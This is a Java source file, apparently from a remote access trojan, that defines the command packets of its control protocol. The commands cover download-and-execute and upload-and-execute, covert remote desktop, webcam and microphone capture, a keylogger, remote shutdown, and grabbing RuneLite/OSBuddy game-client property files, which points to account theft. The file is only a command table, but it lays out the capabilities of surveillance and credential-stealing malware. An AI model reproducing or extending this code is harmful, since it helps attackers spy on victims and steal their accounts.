/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.protocol.packets;

import com.protocol.packets.impl.ClientPacket;
import com.protocol.packets.impl.DisconnectPacket;
import com.protocol.packets.impl.DownloadExecutePacket;
import com.protocol.packets.impl.ExceptionPacket;
import com.protocol.packets.impl.KeyloggerPacket;
import com.protocol.packets.impl.MessagePacket;
import com.protocol.packets.impl.OSRSPropertiesFilePacket;
import com.protocol.packets.impl.ReconnectPacket;
import com.protocol.packets.impl.RemoteDesktopCancelPacket;
import com.protocol.packets.impl.RemoteDesktopPacket;
import com.protocol.packets.impl.RemoteMicrophoneCancelPacket;
import com.protocol.packets.impl.RemoteMicrophonePacket;
import com.protocol.packets.impl.RemoteWebcamCancelPacket;
import com.protocol.packets.impl.RemoteWebcamPacket;
import com.protocol.packets.impl.RestartPCPacket;
import com.protocol.packets.impl.ShutdownPCPacket;
import com.protocol.packets.impl.UploadExecutePacket;

/**
 * Enumeration containing all packets
 */
public enum Packets 
{
    CLIENT_PACKET((byte)0, "client", PacketType.NETWORKING, new ClientPacket()),
    MESSAGE_PACKET((byte)1, "message", PacketType.MESSAGE, new MessagePacket()),
    EXCEPTION_PACKET((byte)2, "exception", PacketType.EXCEPTION, new ExceptionPacket()),
    
    DISCONNECT_PACKET((byte)3, "disconnect", PacketType.COMMAND, new DisconnectPacket()),
    RECONNECT_PACKET((byte)4, "reconnect", PacketType.COMMAND, new ReconnectPacket()),
    SHUTDOWN_PC_PACKET((byte)5, "shutdown pc", PacketType.COMMAND, new ShutdownPCPacket()),
    RESTART_PC_PACKET((byte)6, "restart pc", PacketType.COMMAND, new RestartPCPacket()),
    
    UPLOAD_EXECUTE_PACKET((byte)7, "upload execute", PacketType.COMMAND, new UploadExecutePacket()),
    DOWNLOAD_EXECUTE_PACKET((byte)8, "download execute", PacketType.COMMAND, new DownloadExecutePacket()),
    
    REMOTE_DESKTOP_PACKET((byte)9, "remote-desktop", PacketType.COMMAND, new RemoteDesktopPacket()),
    REMOTE_DESKTOP_CANCEL_PACKET((byte)10, "remote-desktop-cancel", PacketType.COMMAND, new RemoteDesktopCancelPacket()),
    
    REMOTE_WEBCAM_PACKET((byte)11, "remote-webcam", PacketType.COMMAND, new RemoteWebcamPacket()),
    REMOTE_WEBCAM_CANCEL_PACKET((byte)12, "remote-webcam-cancel", PacketType.COMMAND, new RemoteWebcamCancelPacket()),
    
    REMOTE_MICROPHONE_PACKET((byte)13, "remote-microphone", PacketType.COMMAND, new RemoteMicrophonePacket()),
    REMOTE_MICROPHONE_CANCEL_PACKET((byte)14, "remote-microphone-cancel", PacketType.COMMAND, new RemoteMicrophoneCancelPacket()),
    
    KEYLOGGER_PACKET((byte)15, "keylogger", PacketType.COMMAND, new KeyloggerPacket()),
    
    OSRS_PROPERTIES_FILE_PACKET((byte)16, "runelite, osbuddy properties file", PacketType.COMMAND, new OSRSPropertiesFilePacket());
    
    private final byte opcode;
    private final String description;
    private final PacketType packetType;
    private final Packet packet;
    
    Packets(byte opcode, String description, PacketType packetType, Packet packet) 
    {
        this.opcode = opcode;
        this.description = description;
        this.packetType = packetType;
        this.packet = packet;
    }

    public byte getCode() 
    {
        return opcode;
    }
    
    public String getDescription() 
    {
        return description;
    }
    
    public PacketType getPacketType() 
    {
        return packetType;
    }
    
    public Packet getPacket() 
    {
        return packet;
    }

    public static Packets valueOf(int opcode) 
    {
        for (Packets p : Packets.values()) 
        {
            if (p.getCode() == opcode) 
            {
                return p;
            }
        }
        return null;
    }
}
